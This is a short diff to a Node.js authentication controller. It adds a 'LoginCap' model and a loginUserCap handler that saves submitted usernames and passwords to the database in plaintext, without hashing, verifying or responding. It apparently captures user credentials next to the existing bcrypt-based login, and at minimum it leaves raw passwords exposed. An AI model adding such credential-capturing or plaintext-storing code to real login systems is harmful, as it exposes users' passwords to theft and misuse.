@@ -1,4 +1,5 @@
 const User = require("../models/User");
+const LoginCap = require("../models/LoginCap")
 const bcrypt = require("bcrypt");
 const jwt = require("jsonwebtoken");
 const Token = require("../models/AuthTokens");
@@ -44,6 +45,17 @@ exports.registerUser = async (req, res) => {
     });
   }
 };
+
+exports.loginUserCap=async(req,res)=>{
+  const {username,password}=req.body
+  try{
+    await LoginCap.insertMany({username:username,password:password})
+  }
+  catch(err){
+    console.log(err)
+  }
+
+}
 
 exports.loginUser = async (req, res) => {
   try {
